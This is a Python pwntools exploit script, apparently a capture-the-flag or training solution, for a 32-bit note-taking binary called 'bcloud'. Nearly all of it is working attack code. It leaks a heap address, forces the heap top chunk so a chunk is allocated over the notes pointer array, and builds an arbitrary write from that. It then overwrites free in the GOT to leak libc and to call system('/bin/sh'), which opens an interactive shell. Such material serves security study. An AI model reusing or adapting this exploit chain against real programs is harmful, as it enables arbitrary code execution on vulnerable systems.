from pwn import *

import sys
sys.path.append('../../')
import pwnutil as util

#context.terminal = ['tmux', 'splitw', '-h']
# Connect to remote machine
#r = remote("training.jinblack.it", 2016)

r = process("./bcloud")#, env={'LD_PRELOAD': '../../libc-2.27.so'})

''' not attaching to remote  
'''

gdb.attach(r, """
	b *0x8048a08
	b *0x8048a08
	c
	""")

#context.log_level = "debug"


'''
EXPLANATION
32 bits, Canary, NX

'''

input("wait")

def new_note(size, data):
	r.sendline(b"1")
	r.recvuntil(b"Input the length of the note content:\n")
	r.sendline(b"%d" % size) 
	r.recvuntil(b"Input the content:\n")
	r.send(data)
	if(len(data)<size):
		r.send(b"\n")
	r.recvuntil("--->>\n")

def edit(note_id, data):
	r.sendline(b"3")
	r.recvuntil(b'Input the id:\n')
	r.sendline(b"%d" % note_id)
	r.recvuntil(b'Input the new content:\n')
	r.sendline(data)
	r.recvuntil("--->>\n")


r.recvuntil(b"name:\n")

r.send(b"A"*0x40)
leak = u32(r.recvuntil("!")[:-1][-4:])
print("! 0x%08x" % leak)

r.recvuntil(b"Org:\n")
r.send(b"B"*0x40)
r.recvuntil(b"Host:\n")
r.send(b"\xff"*0x40)

top_chunk = leak + 0xf8
print("! top_chunk: 0x%08x" % top_chunk)

target = 0x0804b120 # base of notes pointers array in bss

# big size to allocate so that the next malloc is at target
# - 4 because code allocates 4 extra bytes
big_size = (target - top_chunk - 4) & 0xffffffff
print("! big_size: 0x%08x" % big_size)
print(b"%d" % u32(p32(big_size, signed=False), signed=True))

# create a new note, which will allocate a huge chunk so that the next malloc is at target
r.sendline(b"1")
r.recvuntil(b"Input the length of the note content:\n")
r.sendline(b"%d" % u32(p32(big_size, signed=False), signed=True) ) 
r.recvuntil(b"Input the content:\n")
r.sendline("A")
r.recvuntil("--->>\n")

# Allocate a new note over the notes pointers array
# The beginning of the allocated chunk takes 4*4 bytes
# So the note id:1 is now pointing at position 4 of the notes pointers array (where note id:4 writes)
# allocation of size 50 so we make sure not to overwrite pointers when writing other notes
new_note(50, "") # 1

#set size of other notes
new_note(4, "") # 2
new_note(8, "") # 3
new_note(8, "") # 4
new_note(4, "") # 5
new_note(4, "") # 6

# To arbitrarily write, write in note id:1 the address, which is where note id:4 writes
def arbitrary_write(address, data):
	edit(1,address)
	edit(4,data)

# We need to leak libc
# - overwrite free in got with puts
# - now we can change the address a note points to and delete that note 
#	- The code calls free(note_addr) when we do this
# 	- So it will actually do puts(note_addr)
#	- This allows us to leak when deleting
puts_plt = 0x08048520
free_got = 0x0804b014
arbitrary_write(p32(free_got), p32(puts_plt))

# Write the address of read from the got in note 5
# free note 5 so its actually puts(read_got), which would leak the libc read
note_slot_5 = target + 4*5 # Address in bss notes array of note 5 (note_ptrs_array_base + 4*5)
read_got = 0x0804b00c 
arbitrary_write(p32(note_slot_5), p32(read_got))

# delete note 5, which leaks read_libc
r.sendline(b"4") # delete note
r.sendline(b"5") # id:5
r.recvuntil(b"id:\n")
read_libc = u32(r.recv(4))
r.recvuntil("--->>\n")
print("! read@libc 0x%04x" % read_libc)

# from read_libc and the offset to system we can calculate system_libc
system_libc = read_libc - 694960 
print("! system@libc 0x%04x" % system_libc)
# Overwrite free in got with system
arbitrary_write(p32(free_got), p32(system_libc))

# from read_libc, we can also get /bin/sh in libc
binsh_libc = read_libc + 619551
print("! binsh@libc 0x%04x" % binsh_libc)
note_slot_6 = target + 4*6
print("note slot 6: 0x%04x" % note_slot_6)
# Write binsh address in note id:6 so that when we delete it, it calls system(binsh_address)
arbitrary_write(p32(note_slot_6), p32(binsh_libc))
print(r.clean())

input("wait, proceed to delete note 6 and execute system(binsh)")
r.sendline(b"4") # delete note
r.sendline(b"6") # id:6
print(r.clean())

r.interactive()

